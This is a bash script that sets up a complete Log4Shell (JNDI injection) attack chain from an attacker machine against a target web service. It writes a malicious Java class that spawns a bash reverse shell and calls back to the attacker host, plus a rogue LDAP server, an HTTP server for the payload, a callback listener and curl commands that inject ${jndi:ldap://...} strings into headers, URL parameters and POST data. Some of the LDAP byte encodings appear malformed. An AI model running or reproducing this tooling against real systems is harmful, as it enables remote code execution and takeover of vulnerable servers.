#!/bin/bash
# Remote Log4Shell Exploitation Setup Script
# Run this on your attacker machine (Parrot OS)

ATTACKER_IP="10.0.0.8"  # Change this to your attacker's IP
TARGET_IP="10.0.0.13"
TARGET_PORT="8081"

echo "[*] Log4Shell Remote Exploitation Setup"
echo "[*] Attacker IP: $ATTACKER_IP"
echo "[*] Target: $TARGET_IP:$TARGET_PORT"
echo ""

# Create working directory
mkdir -p ~/log4shell-remote
cd ~/log4shell-remote

# Create malicious Java payload
echo "[+] Creating Exploit.java..."
cat > Exploit.java << 'EOF'
import java.io.*;

public class Exploit {
    static {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                // Windows payload
                Runtime.getRuntime().exec("calc.exe");
                Runtime.getRuntime().exec("cmd.exe /c echo pwned > C:\\Windows\\Temp\\pwned.txt");
            } else {
                // Linux payload
                Runtime.getRuntime().exec("touch /tmp/pwned.txt");
                Runtime.getRuntime().exec("curl http://${ATTACKER_IP}:4444/callback");

                // Try reverse shell (optional)
                String cmd = "bash -i >& /dev/tcp/${ATTACKER_IP}/4444 0>&1";
                Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EOF

# Replace IP in payload
sed -i "s/\${ATTACKER_IP}/$ATTACKER_IP/g" Exploit.java

# Compile payload
echo "[+] Compiling Exploit.class..."
javac -source 8 -target 8 Exploit.java 2>/dev/null || javac Exploit.java

# Create LDAP server
echo "[+] Creating LDAP server script..."
cat > ldap_exploit.py << EOF
#!/usr/bin/env python3
import socket
import sys
import struct

LDAP_PORT = 1389
HTTP_PORT = 8000
ATTACKER_IP = "$ATTACKER_IP"

def create_ldap_response():
    # LDAP Search Result Entry with javaCodeBase
    java_codebase = f"http://{ATTACKER_IP}:{HTTP_PORT}/"
    java_factory = "Exploit"
    java_classname = "Exploit"

    # Build LDAP attributes
    attributes = (
        b'0\x81\xc2' +  # Sequence
        b'\\x04\x00' +  # Object name (empty)
        b'0\x81\xbd' +  # Attributes sequence

        # javaCodeBase attribute
        b'0\x39' +
        b'\\x04\x0cjavaCodeBase' +  # Attribute name
        b'1\x29' +
        b'\\x04\x27' + java_codebase.encode() +

        # javaFactory attribute
        b'0\x2e' +
        b'\\x04\x0bjavaFactory' +
        b'1\x1f' +
        b'\\x04\x1d' + java_factory.encode() +

        # javaClassName attribute
        b'0\x30' +
        b'\\x04\x0djavaClassName' +
        b'1\x1f' +
        b'\\x04\x1d' + java_classname.encode() +

        # objectClass attribute
        b'0\x1c' +
        b'\\x04\x0bobjectClass' +
        b'1\x0d' +
        b'\\x04\x0bjavaNamingReference'
    )

    # LDAP message wrapper
    response = b'0\x81\xc7' + b'\\x02\x01\x02' + b'd\x81\xc1' + attributes + b'0\x0c\\x02\x01\x02e\x07\\x0a\x01\x00\\x04\x00\\x04\x00'

    return response

def start_ldap_server():
    print(f"[*] Starting LDAP server on {ATTACKER_IP}:{LDAP_PORT}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', LDAP_PORT))
    sock.listen(10)

    while True:
        try:
            client, addr = sock.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}")

            # Receive LDAP bind request
            data = client.recv(1024)
            print(f"[*] Received {len(data)} bytes")

            # Send LDAP bind response
            bind_response = b'0\x0c\\x02\x01\x01a\x07\\x0a\x01\x00\\x04\x00\\x04\x00'
            client.send(bind_response)

            # Receive LDAP search request
            data = client.recv(1024)
            print(f"[*] Received search request")

            # Send LDAP search response with Java reference
            search_response = create_ldap_response()
            client.send(search_response)

            print(f"[+] Sent LDAP response pointing to http://{ATTACKER_IP}:{HTTP_PORT}/Exploit.class")
            client.close()

        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    start_ldap_server()
EOF

# Create HTTP server script
echo "[+] Creating HTTP server script..."
cat > http_server.py << EOF
#!/usr/bin/env python3
import http.server
import socketserver
import os

PORT = 8000
ATTACKER_IP = "$ATTACKER_IP"

class ExploitHTTPHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] HTTP request from {self.client_address[0]} for {self.path}")
        if "Exploit.class" in self.path:
            print("[+] Serving Exploit.class")
        return super().do_GET()

    def log_message(self, format, *args):
        print(f"[*] {self.client_address[0]} - {format % args}")

os.chdir(os.path.dirname(os.path.abspath(__file__)))
print(f"[*] Starting HTTP server on {ATTACKER_IP}:{PORT}")
print(f"[*] Serving files from {os.getcwd()}")

with socketserver.TCPServer(("0.0.0.0", PORT), ExploitHTTPHandler) as httpd:
    httpd.serve_forever()
EOF

# Create callback listener
echo "[+] Creating callback listener..."
cat > listener.py << EOF
#!/usr/bin/env python3
import socket

CALLBACK_PORT = 4444
print(f"[*] Starting callback listener on port {CALLBACK_PORT}")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', CALLBACK_PORT))
sock.listen(5)

print("[*] Waiting for callbacks...")
while True:
    client, addr = sock.accept()
    print(f"[+] Callback received from {addr[0]}:{addr[1]}")
    try:
        data = client.recv(1024)
        if data:
            print(f"[+] Data: {data.decode('utf-8', errors='ignore')}")
    except:
        pass
    client.close()
EOF

# Create exploit script
echo "[+] Creating exploitation script..."
cat > exploit.sh << EOF
#!/bin/bash
ATTACKER_IP="$ATTACKER_IP"
TARGET_IP="$TARGET_IP"
TARGET_PORT="$TARGET_PORT"

echo "[*] Launching Log4Shell attack..."
echo "[*] Target: \$TARGET_IP:\$TARGET_PORT"
echo "[*] LDAP Server: \$ATTACKER_IP:1389"

# Various attack vectors
echo "[+] Testing User-Agent header..."
curl -s -H "User-Agent: \\\${jndi:ldap://\$ATTACKER_IP:1389/Exploit}" "http://\$TARGET_IP:\$TARGET_PORT" > /dev/null

echo "[+] Testing X-Api-Version header..."
curl -s -H "X-Api-Version: \\\${jndi:ldap://\$ATTACKER_IP:1389/Exploit}" "http://\$TARGET_IP:\$TARGET_PORT" > /dev/null

echo "[+] Testing URL parameter..."
curl -s "http://\$TARGET_IP:\$TARGET_PORT/?search=\\\${jndi:ldap://\$ATTACKER_IP:1389/Exploit}" > /dev/null

echo "[+] Testing POST data..."
curl -s -X POST -d "username=\\\${jndi:ldap://\$ATTACKER_IP:1389/Exploit}" "http://\$TARGET_IP:\$TARGET_PORT" > /dev/null

echo "[+] Testing Referer header..."
curl -s -H "Referer: \\\${jndi:ldap://\$ATTACKER_IP:1389/Exploit}" "http://\$TARGET_IP:\$TARGET_PORT" > /dev/null

echo "[*] Attack payloads sent. Check LDAP and HTTP servers for connections."
EOF

chmod +x *.sh *.py

# Create start script
echo "[+] Creating start script..."
cat > start_servers.sh << EOF
#!/bin/bash
echo "[*] Starting all servers for Log4Shell exploitation"
echo "[*] Attacker IP: $ATTACKER_IP"
echo ""

# Check if Exploit.class exists
if [ ! -f "Exploit.class" ]; then
    echo "[-] Exploit.class not found. Compiling..."
    javac Exploit.java
fi

# Kill any existing servers
pkill -f ldap_exploit.py 2>/dev/null
pkill -f http_server.py 2>/dev/null
pkill -f listener.py 2>/dev/null

# Start servers in background
echo "[+] Starting HTTP server on port 8000..."
python3 http_server.py &
HTTP_PID=\$!

echo "[+] Starting LDAP server on port 1389..."
sudo python3 ldap_exploit.py &
LDAP_PID=\$!

echo "[+] Starting callback listener on port 4444..."
python3 listener.py &
LISTENER_PID=\$!

echo ""
echo "[*] All servers started!"
echo "[*] HTTP Server PID: \$HTTP_PID"
echo "[*] LDAP Server PID: \$LDAP_PID"
echo "[*] Listener PID: \$LISTENER_PID"
echo ""
echo "[*] To exploit, run: ./exploit.sh"
echo "[*] To stop all servers, run: ./stop_servers.sh"
echo ""
echo "[*] Press Ctrl+C to stop all servers"

# Wait for interrupt
trap "kill \$HTTP_PID \$LDAP_PID \$LISTENER_PID; exit" INT
wait
EOF

# Create stop script
cat > stop_servers.sh << EOF
#!/bin/bash
echo "[*] Stopping all Log4Shell servers..."
pkill -f ldap_exploit.py
pkill -f http_server.py
pkill -f listener.py
echo "[+] All servers stopped"
EOF

chmod +x start_servers.sh stop_servers.sh

echo ""
echo "[+] Setup complete!"
echo ""
echo "Files created in $(pwd):"
ls -la
echo ""
echo "[*] To start exploitation:"
echo "  1. Run: ./start_servers.sh"
echo "  2. In another terminal: ./exploit.sh"
echo ""
echo "[*] Manual exploitation:"
echo "  curl -H \"User-Agent: \\\${jndi:ldap://$ATTACKER_IP:1389/Exploit}\" http://$TARGET_IP:$TARGET_PORT"